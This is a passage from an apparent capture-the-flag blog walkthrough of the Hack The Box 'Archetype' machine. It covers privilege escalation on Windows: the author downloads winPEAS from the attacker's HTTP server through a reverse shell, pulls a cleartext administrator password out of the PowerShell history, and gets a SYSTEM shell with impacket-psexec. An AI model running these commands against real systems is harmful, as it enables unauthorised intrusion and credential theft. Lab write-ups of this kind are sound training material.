</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>/opt/useful/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/binaries/x64/Release<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Once there, we <strong>head over</strong> and <strong>start</strong> our <em><strong>http server</strong></em>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>/opt/useful/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/binaries/x64/Release<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ <span class=nb>cd</span> ~/archetype/
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ python -m http.server <span class=m>4444</span>
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>4444</span> <span class=o>(</span>http://0.0.0.0:4444/<span class=o>)</span> ...
</span></span></code></pre></div><p>Then we use our <strong>reverse shell</strong> to download it to <strong>rhost</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\D</span>ownloads&gt;powershell -c wget http://10.10.14.46:4444/winPEASx64.exe -outfile winPEASx64.exe
</span></span><span class=line><span class=cl>powershell -c wget http://10.10.14.46:4444/winPEASx64.exe -outfile winPEASx64.exe
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\D</span>ownloads&gt;
</span></span></code></pre></div><p>Once <strong>downloaded</strong>, we close up the <strong>http server</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ python -m http.server <span class=m>4444</span>
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>4444</span> <span class=o>(</span>http://0.0.0.0:4444/<span class=o>)</span> ...
</span></span><span class=line><span class=cl>10.129.63.163 - - <span class=o>[</span>11/May/2023 18:06:33<span class=o>]</span> <span class=s2>&#34;GET /winPEASx64.exe HTTP/1.1&#34;</span> <span class=m>200</span> -
</span></span><span class=line><span class=cl>^C
</span></span><span class=line><span class=cl>Keyboard interrupt received, exiting.
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>All that&rsquo;s left for us is to <strong>run it</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\D</span>ownloads&gt;powershell -c .<span class=se>\w</span>inPEASx64.exe
</span></span><span class=line><span class=cl>powershell -c .<span class=se>\w</span>inPEASx64.exe
</span></span><span class=line><span class=cl>ANSI color bit <span class=k>for</span> Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run <span class=s1>&#39;REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1&#39;</span> and <span class=k>then</span> start a new CMD
</span></span><span class=line><span class=cl>     
</span></span><span class=line><span class=cl>             *<span class=o>((</span>,.,/<span class=o>((((((((((((((((((((</span>/,  */               
</span></span><span class=line><span class=cl>      ,/*,..*<span class=o>((((((((((((((((((((((((((((((((((</span>,           
</span></span><span class=line><span class=cl>    ,*/<span class=o>((((((((((((((((((</span>/,  .*//<span class=o>((</span>//**, .*<span class=o>(((((((</span>*       
</span></span><span class=line><span class=cl>    <span class=o>((((((((((((((((</span>**********/########## .<span class=o>(</span>* ,<span class=o>(((((((</span>   
</span></span><span class=line><span class=cl>    <span class=o>(((((((((((</span>/********************/####### .<span class=o>(</span>. <span class=o>(((((((</span>
</span></span><span class=line><span class=cl>    <span class=o>((((((</span>..******************/@@@@@/***/###### ./<span class=o>(((((((</span>
</span></span><span class=line><span class=cl>    ,,....********************@@@@@@@@@@<span class=o>(</span>***,#### .//<span class=o>((((((</span>
</span></span><span class=line><span class=cl>    , ,..********************/@@@@@%@@@@/********##<span class=o>((</span>/ /<span class=o>((((</span>
</span></span><span class=line><span class=cl>    ..<span class=o>((</span><span class=c1>###########*********/%@@@@@@@@@/************,,..((((</span>
</span></span><span class=line><span class=cl>    .<span class=o>(</span><span class=c1>##################(/******/@@@@@/***************.. /((</span>
</span></span><span class=line><span class=cl>    .<span class=o>(</span><span class=c1>#########################(/**********************..*((</span>
</span></span><span class=line><span class=cl>    .<span class=o>(</span><span class=c1>##############################(/*****************.,(((</span>
</span></span><span class=line><span class=cl>    .<span class=o>(</span><span class=c1>###################################(/************..(((</span>
</span></span><span class=line><span class=cl>    .<span class=o>(</span><span class=c1>#######################################(*********..(((</span>
</span></span><span class=line><span class=cl>    .<span class=o>(</span><span class=c1>#######(,.***.,(###################(..***.*******..(((</span>
</span></span><span class=line><span class=cl>    .<span class=o>(</span><span class=c1>#######*(#####((##################((######/(*****..(((</span>
</span></span><span class=line><span class=cl>    .<span class=o>(</span><span class=c1>###################(/***********(##############(...(((</span>
</span></span><span class=line><span class=cl>    .<span class=o>((</span><span class=c1>#####################/*******(################.((((((</span>
</span></span><span class=line><span class=cl>    .<span class=o>(((</span><span class=c1>############################################(..((((</span>
</span></span><span class=line><span class=cl>    ..<span class=o>(((</span><span class=c1>##########################################(..(((((</span>
</span></span><span class=line><span class=cl>    ....<span class=o>((</span><span class=c1>########################################( .(((((</span>
</span></span><span class=line><span class=cl>    ......<span class=o>((</span><span class=c1>####################################( .((((((</span>
</span></span><span class=line><span class=cl>    <span class=o>(((((((((</span><span class=c1>#################################(../((((((</span>
</span></span><span class=line><span class=cl>        <span class=o>(((((((((</span>/##########################<span class=o>(</span>/..<span class=o>((((((</span>
</span></span><span class=line><span class=cl>              <span class=o>(((((((((</span>/,.  ,*//////*,. ./<span class=o>(((((((((((((((</span>.
</span></span><span class=line><span class=cl>                 <span class=o>(((((((((((((((((((((((((((((</span>/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ADVISORY: winpeas should be used <span class=k>for</span> authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner<span class=err>&#39;</span>s permission.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  WinPEASng by @carlospolopm, makikvues<span class=o>(</span>makikvues2<span class=o>[</span>at<span class=o>]</span>gmail<span class=o>[</span>dot<span class=o>]</span>com<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       /---------------------------------------------------------------------------<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>       <span class=p>|</span>                             Do you like PEASS?                            <span class=p>|</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>---------------------------------------------------------------------------<span class=p>|</span> 
</span></span><span class=line><span class=cl>       <span class=p>|</span>         Become a Patreon    :     https://www.patreon.com/peass           <span class=p>|</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>         Follow on Twitter   :     @carlospolopm                           <span class=p>|</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>         Respect on HTB      :     SirBroccoli <span class=p>&amp;</span> makikvues                 <span class=p>|</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>---------------------------------------------------------------------------<span class=p>|</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>                                 Thank you!                                <span class=p>|</span>
</span></span><span class=line><span class=cl>       <span class=se>\-</span>--------------------------------------------------------------------------/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=o>[</span>+<span class=o>]</span> Legend:
</span></span><span class=line><span class=cl>         Red                Indicates a special privilege over an object or something is misconfigured
</span></span><span class=line><span class=cl>         Green              Indicates that some protection is enabled or something is well configured
</span></span><span class=line><span class=cl>         Cyan               Indicates active users
</span></span><span class=line><span class=cl>         Blue               Indicates disabled users
</span></span><span class=line><span class=cl>         LightYellow        Indicates links
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>� You can find a Windows <span class=nb>local</span> PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
</span></span><span class=line><span class=cl>   Creating Dynamic lists, this could take a <span class=k>while</span>, please wait...
</span></span><span class=line><span class=cl>   - Loading YAML definitions file...
</span></span><span class=line><span class=cl>   - Checking <span class=k>if</span> domain...
</span></span><span class=line><span class=cl>   - Getting Win32_UserAccount info...
</span></span><span class=line><span class=cl>   - Creating current user groups list...
</span></span><span class=line><span class=cl>   - Creating active users list <span class=o>(</span><span class=nb>local</span> only<span class=o>)</span>...
</span></span><span class=line><span class=cl>   - Creating disabled users list...
</span></span><span class=line><span class=cl>   - Admin users list...
</span></span><span class=line><span class=cl>   - Creating AppLocker bypass list...
</span></span><span class=line><span class=cl>   - Creating files/directories list <span class=k>for</span> search...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>�����������������������������������͹ System Information �������������������������������������
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>����������͹ Basic System Information
</span></span><span class=line><span class=cl>� Check <span class=k>if</span> the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
</span></span><span class=line><span class=cl>    Hostname: Archetype
</span></span><span class=line><span class=cl>    ProductName: Windows Server <span class=m>2019</span> Standard
</span></span><span class=line><span class=cl>    EditionID: ServerStandard
</span></span><span class=line><span class=cl>    ReleaseId: <span class=m>1809</span>
</span></span><span class=line><span class=cl>    BuildBranch: rs5_release
</span></span><span class=line><span class=cl>    CurrentMajorVersionNumber: <span class=m>10</span>
</span></span><span class=line><span class=cl>    CurrentVersion: 6.3
</span></span><span class=line><span class=cl>    Architecture: AMD64
</span></span><span class=line><span class=cl>    ProcessorCount: <span class=m>2</span>
</span></span><span class=line><span class=cl>    SystemLang: en-US
</span></span><span class=line><span class=cl>    KeyboardLang: English <span class=o>(</span>United States<span class=o>)</span>
</span></span><span class=line><span class=cl>    TimeZone: <span class=o>(</span>UTC-08:00<span class=o>)</span> Pacific Time <span class=o>(</span>US <span class=p>&amp;</span> Canada<span class=o>)</span>
</span></span><span class=line><span class=cl>    IsVirtualMachine: True
</span></span><span class=line><span class=cl>    Current Time: 5/11/2023 10:08:59 AM
</span></span><span class=line><span class=cl>    HighIntegrity: False
</span></span><span class=line><span class=cl>    PartOfDomain: False
</span></span><span class=line><span class=cl>    Hotfixes: KB5004335, KB5003711, KB5004244, 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=o>[</span>?<span class=o>]</span> Windows vulns search powered by Watson<span class=o>(</span>https://github.com/rasta-mouse/Watson<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=o>[</span>*<span class=o>]</span> OS Version: <span class=m>1809</span> <span class=o>(</span>17763<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=o>[</span>*<span class=o>]</span> Enumerating installed KBs...
</span></span><span class=line><span class=cl> <span class=o>[</span>!<span class=o>]</span> CVE-2019-0836 : VULNERABLE
</span></span><span class=line><span class=cl>  <span class=o>[</span>&gt;<span class=o>]</span> https://exploit-db.com/exploits/46718
</span></span><span class=line><span class=cl>  <span class=o>[</span>&gt;<span class=o>]</span> https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>[</span>!<span class=o>]</span> CVE-2019-0841 : VULNERABLE
</span></span><span class=line><span class=cl>  <span class=o>[</span>&gt;<span class=o>]</span> https://github.com/rogue-kdc/CVE-2019-0841
</span></span><span class=line><span class=cl>  <span class=o>[</span>&gt;<span class=o>]</span> https://rastamouse.me/tags/cve-2019-0841/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>[</span>!<span class=o>]</span> CVE-2019-1064 : VULNERABLE
</span></span><span class=line><span class=cl>  <span class=o>[</span>&gt;<span class=o>]</span> https://www.rythmstick.net/posts/cve-2019-1064/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>[</span>!<span class=o>]</span> CVE-2019-1130 : VULNERABLE
</span></span><span class=line><span class=cl>  <span class=o>[</span>&gt;<span class=o>]</span> https://github.com/S3cur3Th1sSh1t/SharpByeBear
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>[</span>!<span class=o>]</span> CVE-2019-1253 : VULNERABLE
</span></span><span class=line><span class=cl>  <span class=o>[</span>&gt;<span class=o>]</span> https://github.com/padovah4ck/CVE-2019-1253
</span></span><span class=line><span class=cl>  <span class=o>[</span>&gt;<span class=o>]</span> https://github.com/sgabe/CVE-2019-1253
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>[</span>!<span class=o>]</span> CVE-2019-1315 : VULNERABLE
</span></span><span class=line><span class=cl>  <span class=o>[</span>&gt;<span class=o>]</span> https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>[</span>!<span class=o>]</span> CVE-2019-1385 : VULNERABLE
</span></span><span class=line><span class=cl>  <span class=o>[</span>&gt;<span class=o>]</span> https://www.youtube.com/watch?v<span class=o>=</span>K6gHnr-VkAg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>[</span>!<span class=o>]</span> CVE-2019-1388 : VULNERABLE
</span></span><span class=line><span class=cl>  <span class=o>[</span>&gt;<span class=o>]</span> https://github.com/jas502n/CVE-2019-1388
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>[</span>!<span class=o>]</span> CVE-2019-1405 : VULNERABLE
</span></span><span class=line><span class=cl>  <span class=o>[</span>&gt;<span class=o>]</span> https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/
</span></span><span class=line><span class=cl>  <span class=o>[</span>&gt;<span class=o>]</span> https://github.com/apt69/COMahawk
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>[</span>!<span class=o>]</span> CVE-2020-0668 : VULNERABLE
</span></span><span class=line><span class=cl>  <span class=o>[</span>&gt;<span class=o>]</span> https://github.com/itm4n/SysTracingPoc
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>[</span>!<span class=o>]</span> CVE-2020-0683 : VULNERABLE
</span></span><span class=line><span class=cl>  <span class=o>[</span>&gt;<span class=o>]</span> https://github.com/padovah4ck/CVE-2020-0683
</span></span><span class=line><span class=cl>  <span class=o>[</span>&gt;<span class=o>]</span> https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/cve-2020-0683.ps1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>[</span>!<span class=o>]</span> CVE-2020-1013 : VULNERABLE
</span></span><span class=line><span class=cl>  <span class=o>[</span>&gt;<span class=o>]</span> https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>[</span>*<span class=o>]</span> Finished. Found <span class=m>12</span> potential vulnerabilities.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>����������͹ Analyzing Windows Files Files <span class=o>(</span>limit 70<span class=o>)</span>
</span></span><span class=line><span class=cl>    C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\W</span>indows<span class=se>\P</span>owerShell<span class=se>\P</span>SReadLine<span class=se>\C</span>onsoleHost_history.txt
</span></span><span class=line><span class=cl>    C:<span class=se>\U</span>sers<span class=se>\D</span>efault<span class=se>\N</span>TUSER.DAT
</span></span><span class=line><span class=cl>    C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\N</span>TUSER.DAT
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>����������͹ Analyzing Other Windows Files Files <span class=o>(</span>limit 70<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       /---------------------------------------------------------------------------<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>       <span class=p>|</span>                             Do you like PEASS?                            <span class=p>|</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>---------------------------------------------------------------------------<span class=p>|</span> 
</span></span><span class=line><span class=cl>       <span class=p>|</span>         Become a Patreon    :     https://www.patreon.com/peass           <span class=p>|</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>         Follow on Twitter   :     @carlospolopm                           <span class=p>|</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>         Respect on HTB      :     SirBroccoli <span class=p>&amp;</span> makikvues                 <span class=p>|</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>---------------------------------------------------------------------------<span class=p>|</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>                                 Thank you!                                <span class=p>|</span>
</span></span><span class=line><span class=cl>       <span class=se>\-</span>--------------------------------------------------------------------------/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\D</span>ownloads&gt;
</span></span></code></pre></div><blockquote><p>winpeas</p></blockquote><h2 id=task-7><strong>TASK 7</strong><a hidden class=anchor aria-hidden=true href=#task-7>#</a></h2><p><strong>Question</strong>: <em>What file contains the administrator&rsquo;s password?</em></p><p>The output from <em><strong>winPEAS</strong></em> is quite <strong>lengthly</strong> (only a snippet is shown in TASK6), but one of the last lines mentioned the location of the <em><strong>powershell</strong></em> <strong>history</strong> file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>����������͹ Analyzing Windows Files Files <span class=o>(</span>limit 70<span class=o>)</span>
</span></span><span class=line><span class=cl>    C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\W</span>indows<span class=se>\P</span>owerShell<span class=se>\P</span>SReadLine<span class=se>\C</span>onsoleHost_history.txt
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p><strong>Checking</strong> it will lead us to some <strong>administrator credentials</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\D</span>ownloads&gt;type C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\W</span>indows<span class=se>\P</span>owerShell<span class=se>\P</span>SReadLine<span class=se>\C</span>onsoleHost_history.txt
</span></span><span class=line><span class=cl><span class=nb>type</span> C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\W</span>indows<span class=se>\P</span>owerShell<span class=se>\P</span>SReadLine<span class=se>\C</span>onsoleHost_history.txt
</span></span><span class=line><span class=cl>net.exe use T: <span class=se>\\</span>Archetype<span class=se>\b</span>ackups /user:administrator MEGACORP_4dm1n!!
</span></span><span class=line><span class=cl><span class=nb>exit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\D</span>ownloads&gt;
</span></span></code></pre></div><blockquote><p>ConsoleHost_history.txt</p></blockquote><h2 id=submit-flag><strong>SUBMIT FLAG</strong><a hidden class=anchor aria-hidden=true href=#submit-flag>#</a></h2><p><strong>Question</strong>: <em>Submit user flag</em></p><p>In TASK5 we used <strong>two</strong> different approaches to <strong>grab</strong> the <strong>user flag</strong>.</p><blockquote><p>flag</p></blockquote><h2 id=submit-flag-1><strong>SUBMIT FLAG</strong><a hidden class=anchor aria-hidden=true href=#submit-flag-1>#</a></h2><p><strong>Question</strong>: <em>Submit root flag</em></p><p>We can use the</p><table><thead><tr><th>admin credentials</th><th></th></tr></thead><tbody><tr><td><em>username</em></td><td style=text-align:left>administrator</td></tr><tr><td><em>password</em></td><td style=text-align:left>MEGACORP_4dm1n!!</td></tr></tbody></table><p>found in TASK7 to get an <strong>admin shell</strong> on the target. Using <em><strong>psexec</strong></em> from <em><strong>impacket</strong></em> will land us <em><strong>system</strong></em> privileges.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ impacket-psexec administrator@<span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright <span class=m>2022</span> Fortra
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Password:
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Requesting shares on 10.129.63.163.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found writable share ADMIN$
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Uploading file ZUxKInhO.exe
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Opening SVCManager on 10.129.63.163.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Creating service EEnc on 10.129.63.163.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting service EEnc.....
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Press <span class=nb>help</span> <span class=k>for</span> extra shell commands
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 10.0.17763.2061<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> <span class=m>2018</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;whoami
</span></span><span class=line><span class=cl>nt authority<span class=se>\s</span>ystem
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows&gt;
</span></span></code></pre></div><p>These <strong>high-level privileges</strong> provide us with <strong>access</strong> to the administrator&rsquo;s desktop - C:\Windows>cd C:\Users\Administrator\Desktop - This is where our <strong>root flag</strong> resides.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\W</span>indows&gt;cd C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is 9565-0B4F
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>07/27/2021  02:30 AM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>07/27/2021  02:30 AM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>02/25/2020  07:36 AM                <span class=m>32</span> root.txt
</span></span><span class=line><span class=cl>               <span class=m>1</span> File<span class=o>(</span>s<span class=o>)</span>             <span class=m>32</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>2</span> Dir<span class=o>(</span>s<span class=o>)</span>  10,689,736,704 bytes free
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;
</span></span></code></pre></div><p>All left for now is to <strong>grab</strong> the <strong>root flag</strong> and <strong>terminate</strong> the connection.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;type root.txt
</span></span><span class=line><span class=cl>&lt;flag&gt;
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;exit
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Process cmd.exe finished with ErrorCode: 0, ReturnCode: <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Opening SVCManager on 10.129.63.163.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Stopping service EEnc.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Removing service EEnc.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Removing file ZUxKInhO.exe.....
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><blockquote><p>flag</p></blockquote><p><strong>Congratulations</strong>, we just successfully <strong>pwned</strong> the <strong>target machine</strong>. All we have left to do now is to <strong>terminate</strong> the <strong>target</strong> box (if not terminated automatically) <strong>before</strong> we <strong>continue</strong> with the next box!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/htb/>htb</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/archetype/>archetype</a></li><li><a href=https://bluewalle.github.io/tags/tier-2/>tier-2</a></li><li><a href=https://bluewalle.github.io/tags/free-tier/>free-tier</a></li><li><a href=https://bluewalle.github.io/tags/network/>network</a></li><li><a href=https://bluewalle.github.io/tags/protocols/>protocols</a></li><li><a href=https://bluewalle.github.io/tags/mssql/>mssql</a></li><li><a href=https://bluewalle.github.io/tags/smb/>smb</a></li><li><a href=https://bluewalle.github.io/tags/impacket/>impacket</a></li><li><a href=https://bluewalle.github.io/tags/powershell/>powershell</a></li><li><a href=https://bluewalle.github.io/tags/reconnaissance/>reconnaissance</a></li><li><a href=https://bluewalle.github.io/tags/remote-code-execution/>remote-code-execution</a></li><li><a href=https://bluewalle.github.io/tags/clear-text-credentials/>clear-text-credentials</a></li><li><a href=https://bluewalle.github.io/tags/information-disclosure/>information-disclosure</a></li><li><a href=https://bluewalle.github.io/tags/anonymous-access/>anonymous-access</a></li><li><a href=https://bluewalle.github.io/tags/guest-access/>guest-access</a></li><li><a href=https://bluewalle.github.io/tags/windows-target/>windows-target</a></li><li><a href=https://bluewalle.github.io/tags/easy-box/>easy-box</a></li><li><a href=https://bluewalle.github.io/tags/user-own/>user-own</a></li><li><a href=https://bluewalle.github.io/tags/system-own/>system-own</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: 